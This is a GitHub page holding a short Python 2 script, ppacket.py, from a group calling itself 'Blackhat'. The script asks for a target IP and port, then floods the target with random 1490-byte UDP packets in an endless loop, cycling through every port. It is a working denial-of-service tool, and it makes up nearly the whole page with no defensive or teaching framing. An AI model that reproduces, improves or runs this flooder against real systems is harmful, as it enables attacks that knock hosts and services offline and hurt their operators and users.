Skip to content
Search or jump to…
Pull requests
Issues
Marketplace
Explore
 
@RevDleecs 
manusia365
/
ppacket
Public
1
32
Code
Issues
Pull requests
Actions
Projects
Wiki
Security
Insights
ppacket/ppacket.py /
@manusia365
manusia365 Add files via upload
Latest commit f454b61 on May 31
 History
 1 contributor
56 lines (51 sloc)  1.13 KB
  
import sys
import os
import time
import socket
import random

K = '\033[93m'
U = '\033[95m'
C = '\033[94m'
R = '\033[91m'
H = '\033[92m'

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Panoc Team")
print
print (H+"Author   : RevDleecs")
print (H+"TEAM     : Blackhat")
print (H+"Thanks   : All Member Panoc")
print
ip = raw_input(R+"IP Target : ")
port = input(R+"Port       : ")

os.system("clear")
os.system("figlet Packet Starting")
print "[                    ] 0% "
time.sleep(1)
print "[=====               ] 25%"
time.sleep(1)
print "[==========          ] 50%"
time.sleep(1)
print "[===============     ] 75%"
time.sleep(1)
print "[====================] 100%"
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print (R+"RevDleecs %s Sent Paclet To %s throught port %s"%(sent,ip,port))
     if port == 65534:
       port = 1
